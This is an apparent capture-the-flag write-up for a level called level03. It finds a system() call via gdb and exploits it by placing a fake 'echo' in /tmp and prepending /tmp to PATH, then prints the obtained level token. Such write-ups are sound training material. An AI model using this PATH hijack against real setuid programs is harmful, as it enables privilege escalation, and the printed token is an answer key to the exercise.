# level03 is an executable that contains the system function (you can check it with gdb or strace)
- ./level03
# gdb level03
- disas main
- we can see a call for the 'system function' 
- The command x/s is used to examine memory and display the contents as a string. Specifically:

x is the command to examine memory.
/s is a format specifier that tells GDB to interpret the memory content as a string (s stands for "string").
- x/s <address>


# When x/s 0x80485e0, It takes as a parameter on 0x80485e0: /usr/bin/env followed by echo Exploit me

# Since it uses echo, we'll create an executable with the same name, a fake 'echo'
- echo "/bin/sh -c 'getflag'" > /tmp/echo
- chmod 755 /tmp/echo
- export PATH=/tmp:$PATH (ajoute /tmp dans le path pour qu'il l'execute avant)
- ./level03


# Token obtained: we directly used 'getflag' thanks to system so no need to 'su flag03', go direct to su level04 with this token :
qi0maab88jeaj46qoumi7maus
